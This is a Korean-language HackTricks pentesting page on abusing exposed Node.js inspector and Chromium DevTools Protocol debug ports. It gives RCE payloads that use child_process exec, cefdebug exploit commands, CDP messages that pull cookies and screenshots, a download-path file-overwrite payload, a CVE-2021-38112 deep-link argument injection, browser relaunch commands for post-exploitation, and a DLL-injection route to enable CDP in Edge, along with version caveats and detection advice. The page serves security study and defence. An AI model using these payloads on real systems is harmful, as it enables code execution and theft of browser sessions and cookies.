# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

역사적인 실전 예제로는 Multimaster walkthrough와 CVE-2019-1414 Visual Studio Code debugger attack이 있으며, 모든 최신 Electron 또는 Chromium target이 동일한 primitive를 노출한다고 가정하지 말고 version-specific context로 사용해야 합니다.<sup>[[1]](#references)[[3]](#references)</sup>

## 기본 정보

[문서에서](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch를 사용하여 시작하면 Node.js process는 debugging client의 연결을 수신합니다. **기본적으로**, host 및 port **`127.0.0.1:9229`**에서 수신합니다. 각 process에는 **고유한** **UUID**도 할당됩니다.<sup>[[4]](#references)</sup>

Inspector client가 연결하려면 host address, port 및 UUID를 알고 지정해야 합니다. 전체 URL은 다음과 같은 형식입니다: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger는 Node.js execution environment에 대한 완전한 access 권한을 가지므로**, 이 port에 연결할 수 있는 malicious actor는 Node.js process를 대신하여 arbitrary code를 실행할 수 있습니다(**potential privilege escalation**).<sup>[[4]](#references)</sup>

Inspector를 시작하는 방법은 여러 가지가 있습니다:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
검사 중인 프로세스를 시작하면 다음과 같은 내용이 표시됩니다:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) 기반 프로세스는 `--remote-debugging-port=9222`를 사용해 debugger를 노출할 수 있습니다. 이는 Node.js inspector가 아닌 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 browser를 노출하므로, Node.js `process` 기반 payload는 기본적으로 직접 적용할 수 없습니다.<sup>[[2]](#references)[[5]](#references)</sup>

debugging이 활성화된 browser를 시작하면 다음과 비슷한 내용이 표시됩니다:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### CDP endpoint 열거 및 구동

HTTP discovery endpoints는 **browser** WebSocket과 개별 **target**(tab, worker, extension 등) WebSocket을 구분합니다. browser endpoint에는 `/json/version`을, target에는 `/json/list`를 쿼리하세요. 그런 다음 반환된 `webSocketDebuggerUrl` 값을 CDP의 JSON-RPC-like messages와 함께 직접 구동할 수 있습니다.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
예를 들어, `websocat "$BROWSER_WS"`로 연결한 다음 `{"id":1,"method":"Target.getTargets"}` 또는 `{"id":2,"method":"Storage.getCookies"}`를 전송합니다. 페이지 target(`websocat "$PAGE_WS"`)에서는 `Runtime.evaluate`가 해당 renderer에서 실행되고, `Page.captureScreenshot`은 base64-encoded screenshot을 반환합니다. `document.cookie`로는 `HttpOnly` cookies를 확인할 수 없지만, `Storage.getCookies`는 browser의 cookie store에 요청합니다.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### 브라우저, WebSockets 및 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열리는 웹사이트는 브라우저 보안 모델에 따라 WebSocket 및 HTTP 요청을 보낼 수 있습니다. **고유한 debugger session id를 얻으려면** **초기 HTTP 연결**이 필요합니다. **same-origin-policy**는 웹사이트가 **이 HTTP 연결**을 생성하지 못하도록 **방지합니다**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**에** 대한 추가 보안을 위해 Node.js는 연결의 **'Host' headers**가 **IP address** 또는 정확히 **`localhost`**를 지정하는지 확인합니다.<sup>[[4]](#references)</sup>

> [!TIP]
> 이러한 **security measures는 inspector를 악용하여** **HTTP request를 보내는 것만으로** 코드를 실행하는 것을 방지합니다(SSRF vuln을 악용하면 가능했을 작업).<sup>[[4]](#references)</sup>

### 실행 중인 프로세스에서 inspector 시작하기

실행 중인 nodejs 프로세스에 **signal SIGUSR1**을 보내면 기본 포트에서 **inspector를 시작**하도록 만들 수 있습니다. 그러나 충분한 권한이 필요하므로, 이는 **프로세스 내부 정보에 대한 privileged access를 부여할 수 있지만** 직접적인 privilege escalation은 아닙니다.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> 이는 **process를 종료하고** `--inspect`를 사용해 **새 process를 시작하는 것**이 **옵션이 아닌** containers에서 유용합니다. process와 함께 **container**도 **종료되기 때문입니다**.<sup>[[6]](#references)</sup>

### inspector/debugger에 연결

**Chromium 기반 browser**에 연결하려면 Chrome 또는 Edge에서 각각 `chrome://inspect` 또는 `edge://inspect` URL에 액세스할 수 있습니다. Configure 버튼을 클릭하여 **target host와 port**가 올바르게 나열되어 있는지 확인해야 합니다. 다음 이미지는 Remote Code Execution (RCE) 예시를 보여줍니다:<sup>[[2]](#references)[[4]](#references)</sup>

![debugger에 액세스할 URL이 표시됩니다. 예: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger에 연결: Chromium 기반 browser에 연결하려면 ...](<../../images/image (674).png>)

**command line**을 사용하면 다음과 같이 debugger/inspector에 연결할 수 있습니다:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)는 로컬에서 실행 중인 **inspectors**를 **찾고**, 해당 프로세스에 **code를 주입**할 수 있습니다.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 browser에 연결된 경우 **NodeJS RCE exploits**는 작동하지 않는다는 점에 유의하세요(**API**를 확인하여 이를 통해 수행할 수 있는 흥미로운 작업을 찾아야 합니다).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector의 RCE

> [!TIP]
> [**Electron의 XSS에서 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

**Node inspector**에 **connect**할 수 있을 때 **RCE**를 얻는 일반적인 방법으로는 다음과 같은 것을 사용할 수 있습니다(이 방법은 **Chrome DevTools protocol** 연결에서는 작동하지 않는 것으로 보입니다).<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API는 여기에서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
이 섹션에서는 사람들이 이 protocol을 exploit하는 데 사용한 흥미로운 방법을 간단히 나열하겠습니다.

### Chrome 136+ default-profile restriction

**Chrome 136**부터 Chrome은 **default Chrome data directory**를 대상으로 하는 경우 `--remote-debugging-port` 및 `--remote-debugging-pipe`를 무시합니다. 이 switch는 표준이 아닌 `--user-data-dir`와 함께 사용해야 합니다. 별도의 encryption key와 격리된 browser state가 일반 사용자의 인증된 profile이 단순한 flag 기반 technique으로 노출되는 것을 방지합니다. 이 Chrome 전용 restriction이 이전 Chrome build, Chrome for Testing, Electron/CEF application 또는 검증되지 않은 기타 Chromium derivative에도 적용된다고 가정해서는 안 됩니다.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
따라서 현재 Chrome process가 `--remote-debugging-port`만 사용해 실행되었다는 사실만으로는 **CDP가 활성화되었다고 증명할 수 없습니다**. listener와 `/json/version`을 확인하고, 실제로 어떤 profile이 이를 뒷받침하는지 파악해야 합니다.<sup>[[14]](#references)</sup>

### Deep Links를 통한 Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino security는 CEF 기반 애플리케이션이 시스템에 **custom URI**(workspaces://index.html)를 등록하여 전체 URI를 전달받은 다음, 해당 URI로부터 일부를 구성한 configuration으로 **CEF 기반 애플리케이션**을 실행한다는 사실을 발견했습니다.<sup>[[8]](#references)</sup>

URI parameters가 URL decoded된 후 CEF 기반 애플리케이션을 실행하는 데 사용되므로, 사용자가 **inject**를 통해 **`--gpu-launcher`** flag를 **command line**에 추가하고 임의의 작업을 실행할 수 있다는 사실이 밝혀졌습니다.<sup>[[8]](#references)</sup>

따라서 다음과 같은 payload를 사용할 수 있습니다:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe를 실행합니다.<sup>[[8]](#references)</sup>

### 파일 덮어쓰기

**다운로드한 파일이 저장될 폴더**를 변경한 다음, 파일을 다운로드하여 애플리케이션에서 자주 사용하는 **source code**를 **malicious code**로 **덮어씁니다**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE 및 데이터 exfiltration

STAR Labs는 노출된 WebDriver/CDP 서비스가 arbitrary file reads와 RCE를 가능하게 할 수 있으며, 일부 구성에서는 DNS rebinding이 exploit chain을 완성할 수 있음을 보여주었습니다.<sup>[[9]](#references)</sup>

추가적인 과거 browser-automation 및 Chromium security 사례는 Counter WebDriver write-up과 Project Zero issues 773, 1742, 1944를 참조하세요.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 실행 중인 Chromium process 내부에서 CDP 활성화

Windows에서 [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler)는 command-line restriction이 CDP를 활성화하는 유일한 방법이 아님을 보여주었습니다. 기존 `msedge.exe`에 inject할 수 있는 code는 Chromium의 non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer`를 호출하여 browser를 restart하지 않고 authenticated live profile을 노출할 수 있습니다.<sup>[[15]](#references)</sup>

시연된 chain은 `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`를 사용해 DLL을 inject하고, internal Edge symbols를 resolve하며(먼저 PDB에서, 이후 version-specific byte signatures를 사용), browser window를 subclass하고, 최종 server-start call이 browser **UI thread**에서 실행되도록 message를 post합니다. Socket은 loopback에 bind되며, 그 후 일반적인 CDP primitives를 사용해 cookies를 가져오고, tabs를 capture하며, network traffic을 inspect하거나 authenticated pages에서 JavaScript를 evaluate할 수 있습니다.<sup>[[15]](#references)</sup>

> [!WARNING]
> 이는 **post-compromise/process-injection** technique이며, unauthenticated network bypass가 아닙니다. 관련 C++ symbols가 export되지 않고 browser updates 후 signatures가 변경될 수 있으므로 build 의존성이 매우 높습니다.<sup>[[15]](#references)</sup>

Detection 시 `--remote-debugging-*` command-line telemetry에만 의존하지 마세요. browser processes에 대한 비정상적인 handles와 memory operations(`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, 그리고 Chrome/Edge가 소유한 예상치 못한 loopback listening sockets도 함께 correlate해야 합니다.<sup>[[15]](#references)</sup>

### Post-Exploitation

실제 환경에서 Chromium-based browser를 사용하는 user PC를 **compromising한 후**의 과거 technique으로는 browser를 debugging enabled 상태로 relaunch하고 loopback port를 forward하는 방법이 있었습니다. 이는 선택한 profile을 여전히 accept하는 products/builds에서 victim의 browsing state를 노출할 수 있지만, Chrome 136+에서는 default data directory에 대해 이 방법을 더 이상 honor하지 않습니다.<sup>[[7]](#references)[[14]](#references)</sup>

기존 relaunch command는 이전 버전 또는 version-specific targets를 위해 아래에 보존합니다. 두 번째 command는 현재 Chrome에서 지원되는 형식이지만 victim의 일반적인 authenticated state를 다시 여는 대신 isolated profile을 생성합니다.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
macOS-specific Chromium relaunch, extension, 및 CDP tradecraft는 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)을 참조하세요.



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger 검사 및 exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger를 통한 Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - 시작하기](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome의 Debugging Feature를 악용하여 Browsing Session을 원격으로 관찰 및 제어하기](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding 및 CDP를 통한 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot에서 RCE까지](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [보안 향상을 위한 remote debugging switches 변경 사항 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [실행 중인 Edge Browser에 CDP 주입하기: Runtime Browser Instrumentation 심층 분석](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
